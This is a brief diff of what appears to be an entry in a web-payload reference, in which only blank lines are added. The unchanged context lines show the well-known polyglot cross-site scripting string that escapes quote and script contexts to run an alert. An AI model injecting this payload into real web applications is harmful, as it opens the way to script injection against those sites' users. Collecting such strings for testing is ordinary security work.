@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:21:55.867714+00:00'
 ```javascript
 ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
 ```
+
+
